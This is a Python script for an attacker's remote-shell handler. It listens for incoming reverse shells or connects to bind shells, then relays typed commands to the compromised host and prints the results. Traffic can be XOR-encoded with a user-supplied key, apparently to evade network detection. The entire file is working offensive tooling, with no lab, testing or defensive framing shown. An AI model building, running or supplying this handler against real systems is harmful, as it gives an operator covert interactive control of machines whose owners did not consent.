#!/usr/bin/env python3
import asyncio
import argparse
import sys
from utils import xor_encoder




def get_args() -> argparse.Namespace:
    args = argparse.ArgumentParser(sys.argv[0], '%s [options] [listen | connect ] host port')
    args.add_argument('-x', '--xor', type=str, default=None,
                      help='Enable base64 wrapped xor with this key otherwise disabled')
    args.add_argument('-v', '--verbose', action='count', default=0, help='Enable debug messages')
    subparsers = args.add_subparsers(dest='command')
    listen = subparsers.add_parser('listen', help='Start tcp server, wait for reverse shell')
    listen.add_argument('host', type=str, default='127.0.0.1', help='Listen on IP')
    listen.add_argument('port', type=int, default=1337, help='Listen on port')
    connect = subparsers.add_parser('connect', help='Connect to a bind shell.')
    connect.add_argument('host', type=str, default='127.0.0.1', help='Connect to IP')
    connect.add_argument('port', type=int, default=1337, help='Connect to port')

    return args.parse_args()




class BindHandler:
    def __init__(self, host: str, port: int, key: str = None):
        self.host = host
        self.port = port
        self.xor = xor_encoder.Xor(key)
        self.server_task = None

    async def echo_server(self, reader, writer):
        writer.write(self.xor.encoder('#HELLO\n'))
        while True:
            data = await reader.read(4096)  # Max number of bytes to read
            if not data:
                break
            data = self.xor.decoder(data)
            if data.strip('\r\n') == '__EOF__':
                print("Connection closed.")
                writer.close()
                await writer.wait_closed()
                self.server_task.cancel()
                return

            print(data)
            cmd = input('>> ')
            enc_cmd = self.xor.encoder(cmd + '\n')
            writer.write(enc_cmd)
            await writer.drain()  # Flow control, see later
        writer.close()

    async def main(self):
        server = await asyncio.start_server(self.echo_server, self.host, self.port)
        async with server:
            self.server_task = asyncio.create_task(server.serve_forever())
            try:
                await self.server_task
            except asyncio.CancelledError:
                exit()

class ConnectHandler:
    def __init__(self, host: str, port: int, key: str = None):
        self.host = host
        self.port = port
        self.key = key
        self.reader = None
        self.writer = None
        self.xor = xor_encoder.Xor(key)

    async def main(self):
        self.reader, self.writer = await asyncio.open_connection(self.host, self.port)
        self.writer.write(self.xor.encoder('#HELLO\n'))
        while True:
            data = await self.reader.read(1024)
            data = self.xor.decoder(data)
            if data.strip('\r\n') == '__EOF__':
                print("Connection closed.")
                self.writer.close()
                await self.writer.wait_closed()
                return
            print(data)
            cmd = input('>> ')
            self.writer.write(self.xor.encoder(f'{cmd}\n'))


async def async_main(_args: argparse.Namespace):
    key = _args.xor
    if _args.command == 'connect':
        handler = ConnectHandler(_args.host, _args.port, key)
        return await handler.main()
    else:
        handler = BindHandler(_args.host, _args.port, key)
        return await handler.main()


def main():
    asyncio.run(async_main(get_args()))


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()
